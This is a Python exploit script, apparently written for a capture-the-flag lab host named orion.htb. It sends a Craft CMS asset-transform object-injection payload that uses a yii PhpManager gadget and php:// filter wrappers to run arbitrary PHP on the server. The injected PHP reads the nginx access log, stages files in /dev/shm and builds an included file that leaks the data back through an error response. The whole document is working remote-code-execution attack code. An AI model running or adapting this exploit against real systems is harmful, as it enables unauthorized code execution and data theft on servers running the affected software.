import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    filt = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":filt}]}}}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=15)

# Step 1: Analyze access.log for PHP tags
php1 = '<?php ' \
    '$f = file_get_contents("/var/log/nginx/access.log"); ' \
    '$p = []; ' \
    'preg_match_all("/<\\?php/i", $f, $p, PREG_OFFSET_CAPTURE); ' \
    '$out = "PHP_TAGS_FOUND:" . count($p[0]); ' \
    'foreach ($p[0] as $k => $m) { ' \
    '  $out .= "\\n#" . $k . " at byte " . $m[1] . ": " . substr($f, max(0,$m[1]-10), min(60, strlen($f)-$m[1])); ' \
    '} ' \
    'file_put_contents("/dev/shm/php_tag_positions.txt", $out); ' \
    '$lines = explode("\\n", $f); ' \
    'if (count($lines) >= 160) { ' \
    '  file_put_contents("/dev/shm/line160.txt", "Line 156-165:\\n" . implode("\\n", array_slice($lines, 155, 10))); ' \
    '} '

print("[*] Step 1: Analyzing access.log ...")
r = inject_b64(php1)
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 2: Build a self-flushing file
php2 = '<?php ' \
    '$pos = @file_get_contents("/dev/shm/php_tag_positions.txt") ?: "NOFILE1"; ' \
    '$l160 = @file_get_contents("/dev/shm/line160.txt") ?: "NOFILE2"; ' \
    '# Build file mimicking access.log: text then <?php error ' \
    ' '
# Use str_repeat to generate ~30KB of padding
php2 += '$c = str_repeat("PADDING_LINE\\n", 600); '
php2 += '$c .= "<?php echo UNDEFINED_CONSTANT_XYZ; ?>\\n"; '
php2 += '$c .= "\\n=== EXFIL DATA ===\\n"; '
php2 += '$c .= $pos . "\\n"; '
php2 += '$c .= "=== LINE160 ===\\n"; '
php2 += '$c .= $l160 . "\\n"; '
php2 += '$c .= "=== END EXFIL ===\\n"; '
php2 += 'file_put_contents("/dev/shm/self_flush.php", $c); '

print("[*] Step 2: Building self-flushing file ...")
r = inject_b64(php2)
print(f"    Status: {r.status_code}")
time.sleep(1)

# Step 3: Include the self-flushing file
print("[*] Step 3: Including self-flushing file ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/dev/shm/self_flush.php"}]}}}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers={'Content-Type':'application/json','X-CSRF-Token':tok}, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

for kw in ['PADDING_LINE', 'PHP_TAGS', 'EXFIL DATA', 'NOFILE', 'Line 156', '===', 'UNDEFINED']:
    if kw in t:
        idx = t.index(kw)
        print(f'[+] FOUND "{kw}" at byte {idx}')
        print(f'    Context: {t[max(0,idx-20):idx+300]}')
    else:
        print(f'[-] "{kw}" not found')

print(f'\n--- First 300 bytes ---')
print(t[:300])
print(f'\n--- Last 600 bytes ---')
print(t[-600:])
